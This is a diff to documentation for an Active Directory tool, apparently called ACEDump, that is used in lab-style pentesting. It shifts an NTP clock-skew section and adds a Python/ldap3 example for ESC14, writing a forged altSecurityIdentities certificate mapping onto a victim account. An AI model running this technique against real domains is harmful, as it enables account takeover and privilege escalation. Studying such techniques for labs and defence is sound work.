@@ -79,6 +79,15 @@ Credentials
 
 |
 
+***
+NTP
+***
+
+| ACEDump mock LDAP's clock using currentTime attribute and libfaketime.
+| Use dontfixtime option if you want to deal with clock skew by yourself
+
+|
+
 ***********
 Interactive
 ***********
@@ -120,11 +129,22 @@ Interactive
 
 |
 
+| Example to set VICTIM's altSecurityIdentities attribute for ESC14.
+
+.. code-block:: bash
+
+    target_dn = 'CN=victim,OU=Foobar,DC=box,DC=htb'
+    issuer = 'DC=htb, DC=box, CN=box-DC01-CA'
+    serial = '61:00:00:00:05:3d:d7:2a:1a:e6:6f:aa:f3:00:00:00:00:00:04'
+
+    serial = ''.join(serial.split(':')[::-1])
+    altSecurityIdentities = f"X509:<I>{issuer.replace(', ', ',')}<SR>{serial}"
+    
+    print(altSecurityIdentities)
+    # X509:<I>DC=htb,DC=box,CN=box-DC01-CA<SR>040000000000f3aa6fe61a2ad73d0500000061
+
+    import ldap3
+    conn.modify(target_dn,{'altSecurityIdentities':[(ldap3.MODIFY_ADD, altSecurityIdentities)]})
+    # Return True if changed
+
 |
-
-***
-NTP
-***
-
-| ACEDump use ldap server's time by default using libfaketime.
-| Use dontfixtime option if you want to deal with clock skew by yourself
